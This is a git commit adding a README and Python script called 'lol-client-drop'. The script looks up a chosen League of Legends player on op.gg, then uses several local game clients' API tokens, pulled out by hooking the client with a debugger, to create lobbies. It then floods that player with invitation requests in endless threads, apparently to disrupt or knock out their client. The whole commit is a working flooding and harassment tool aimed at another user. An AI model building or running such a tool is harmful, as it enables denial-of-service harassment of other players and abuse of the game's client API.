0d659ba31cb45a4f3b445f32d2c34f292879cd71
Stamatios Theodosiadis <stheodosi@csd.auth.gr>
2021-01-22 02:26:49 +0200

    initial commit

---
+++ README.md
@@ -0,0 +1,22 @@
+# lol-client-drop #
+
+This is referring to people who know what they're doing.
+I won't bother explaining every single step you have to take to make this script work.
+
+## Run multiple clients
+
+* <b>Windows:</b>
+    * Run League of Legends with this argument: `--allow-multiple-clients`
+
+* <b>MacOS:</b>
+    * TODO: Use AppleScript
+
+## Get port & auth token
+
+* <b>Windows:</b>
+    * Place `SimpleDebugger.exe` inside your League of Legends folder (where `LeagueClient.exe` is located).
+    * Start SimpleDebugger and press `enter` to hook the client, then exit.
+    * Now each time you start your League Client, the SimpleDebugger process will pop up and show you useful info.
+
+* <b>MacOS:</b>
+    * TODO: Create simple debugger for MacOS
---
+++ main.py
@@ -0,0 +1,143 @@
+import sys
+import requests
+import json
+from time import sleep
+from selenium import webdriver
+from datetime import datetime
+from lcu_driver import Connector
+import psutil
+import threading
+import base64
+
+# TODO: use lcu_driver
+
+# fill in as 'app-port' -> 'auth_token'
+auths = {
+    '51789': 'auth token 1', # account1
+    '51935': 'auth token 2', # account2
+    '52103': 'auth token 3', # account3
+}
+
+# suppress warnings
+requests.packages.urllib3.disable_warnings() 
+
+def spam(url, data, headers):
+    # start flooding invitations
+    while True:
+        r = requests.post(url, data=data, headers=headers, verify=False)
+        print('[' + datetime.now().strftime('%H:%M:%S') + '] Flooding...')
+        print('[Response] ' + r.text)
+        #sleep(0.01)
+
+def main():
+    # implement method to get app port & session token
+
+    if len(sys.argv) < 3:
+        print('Usage: python main.py "Summoner Name" "Region"')
+        sys.exit()
+
+    summoner_name = sys.argv[1]
+    region = sys.argv[2]
+
+    if (not region == 'eune') and (not region == 'euw') and (not region == 'na'):
+        print('Invalid region. Please use: eune / euw / na')
+        sys.exit()
+
+    gameServerRegion = 'EUN1'
+    if region == 'euw':
+        gameServerRegion = 'EUW1'
+    elif region == 'na':
+        gameServerRegion = 'NA1'
+
+    print('Loading ChromeDriver...')
+
+    chrome_options = webdriver.ChromeOptions()
+    chrome_options.add_argument('--disable-extensions')
+    chrome_options.add_argument('--start-maximized') # works on Windows
+    chrome_options.add_argument('--start-fullscreen') # works on Mac
+    chrome_options.add_argument('--headless')
+    chrome_options.add_argument('--user-agent=Mozilla/5.0 (Macintosh; Intel Mac OS X 11_0_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36')
+    chrome_options.add_argument('--disable-gpu')
+    chrome_options.add_argument('--mute-audio')
+    chrome_options.add_argument('--disable-dev-shm-usage')
+    chrome_options.add_argument('--no-sandbox')
+    chrome_options.add_argument('--ignore-certificate-errors')
+    chrome_options.add_argument('--allow-running-insecure-content')
+    chrome_options.add_argument('--log-level=3') # hide console warnings
+
+    driver = webdriver.Chrome('chromedriver', options=chrome_options)
+
+    opgg_link = 'https://' + region + '.op.gg/summoner/userName=' + summoner_name
+
+    print('Grabbing Summoner Name & ID...')
+
+    driver.get(opgg_link)
+
+    sid_element = driver.find_element_by_xpath('//div[@class="GameListContainer"]')
+
+    summoner_id = sid_element.get_attribute('data-summoner-id')
+    summoner_name = driver.find_element_by_xpath('//span[@class="Name"]').text
+
+    print('Summoner Name: ' + summoner_name)
+    print('Summoner ID: ' + summoner_id)
+
+    sleep(1)
+
+    for app_port, auth_token in auths.items():
+        api = 'https://127.0.0.1:' + app_port
+
+        session_token = base64.b64encode(('riot:' + auth_token).encode('ascii')).decode('ascii')
+
+        headers = {
+            'Content-Type': 'application/json',
+            'Accept': 'application/json',
+            'Authorization': 'Basic ' + session_token
+        }
+
+        # actual script
+        post_lobby_url = api + '/lol-lobby/v2/lobby'
+        post_inv_url = api + '/lol-lobby/v2/lobby/invitations'
+
+        # text to one line
+        post_lobby_data = '{"customGameLobby": {"configuration": {"gameMode": "CLASSIC","gameServerRegion": "' + gameServerRegion + '","gameTypeConfig": {"advancedLearningQuests": true,"allowTrades": true,"banMode": "string","banTimerDuration": 0,"battleBoost": true,"crossTeamChampionPool": true,"deathMatch": true,"doNotRemove": true,"duplicatePick": true,"exclusivePick": true,"gameModeOverride": "string","id": 0,"learningQuests": true,"mainPickTimerDuration": 0,"maxAllowableBans": 0,"name": "string","numPlayersPerTeamOverride": 0,"onboardCoopBeginner": true,"pickMode": "string","postPickTimerDuration": 0,"reroll": true,"teamChampionPool": true},"mapId": 11,"maxPlayerCount": 0,"mutators": {"advancedLearningQuests": true,"allowTrades": true,"banMode": "string","banTimerDuration": 0,"battleBoost": true,"crossTeamChampionPool": true,"deathMatch": true,"doNotRemove": true,"duplicatePick": true,"exclusivePick": true,"gameModeOverride": "string","id": 0,"learningQuests": true,"mainPickTimerDuration": 0,"maxAllowableBans": 0,"name": "string","numPlayersPerTeamOverride": 0,"onboardCoopBeginner": true,"pickMode": "string","postPickTimerDuration": 0,"reroll": true,"teamChampionPool": true},"spectatorPolicy": "NotAllowed","teamSize": 0,"tournamentGameMode": "string","tournamentPassbackDataPacket": "string","tournamentPassbackUrl": "string"},"gameId": 0,"lobbyName": "string","lobbyPassword": "string","practiceGameRewardsDisabledReasons": ["string"],"spectators": [{"autoFillEligible": true,"autoFillProtectedForPromos": true,"autoFillProtectedForSoloing": true,"autoFillProtectedForStreaking": true,"botChampionId": 0,"botDifficulty": "NONE","canInviteOthers": true,"excludedPositionPreference": "string","id": 0,"isBot": true,"isOwner": true,"isSpectator": true,"positionPreferences": {"firstPreference": "string","secondPreference": "string"},"showPositionExcluder": true,"summonerInternalName": "string"}],"teamOne": [{"autoFillEligible": true,"autoFillProtectedForPromos": true,"autoFillProtectedForSoloing": true,"autoFillProtectedForStreaking": true,"botChampionId": 0,"botDifficulty": "NONE","canInviteOthers": true,"excludedPositionPreference": "string","id": 0,"isBot": true,"isOwner": true,"isSpectator": true,"positionPreferences": {"firstPreference": "string","secondPreference": "string"},"showPositionExcluder": true,"summonerInternalName": "string"}],"teamTwo": [{"autoFillEligible": true,"autoFillProtectedForPromos": true,"autoFillProtectedForSoloing": true,"autoFillProtectedForStreaking": true,"botChampionId": 0,"botDifficulty": "NONE","canInviteOthers": true,"excludedPositionPreference": "string","id": 0,"isBot": true,"isOwner": true,"isSpectator": true,"positionPreferences": {"firstPreference": "string","secondPreference": "string"},"showPositionExcluder": true,"summonerInternalName": "string"}]},"gameCustomization": {},"isCustom": false,"queueId": 830}'
+        post_inv_data = '[{"invitationId": "", "state": "Requested", "timestamp": "", "toSummonerId": ' + summoner_id + ', "toSummonerName": "' + summoner_name + '"}]'
+
+        # create lobby
+        r = requests.post(post_lobby_url, data=post_lobby_data, headers=headers, verify=False)
+
+        thr = threading.Thread(target=spam, args=(post_inv_url, post_inv_data, headers,))
+        thr.daemon = True # make thread daemon so it kills when we exit script
+        thr.start()
+
+    # keep main thread alive
+    try:
+        while True:
+            sleep(1)
+    except KeyboardInterrupt:
+        sys.exit()
+
+#debugging
+def findProcessIdByName(processName):
+    '''
+    Get a list of all the PIDs of a all the running process whose name contains
+    the given string processName
+    '''
+    listOfProcessObjects = []
+    #Iterate over the all the running process
+    for proc in psutil.process_iter():
+       try:
+           pinfo = proc.as_dict(attrs=['pid', 'name', 'create_time'])
+           # Check if process name contains the given name string.
+           if processName.lower() in pinfo['name'].lower() :
+               listOfProcessObjects.append(pinfo)
+       except (psutil.NoSuchProcess, psutil.AccessDenied , psutil.ZombieProcess) :
+           pass
+    return listOfProcessObjects
+
+#debugging
+def main1():
+    print(findProcessIdByName('SimpleDebugger'))
+    sys.exit()
+
+if __name__ == '__main__':
+    main()
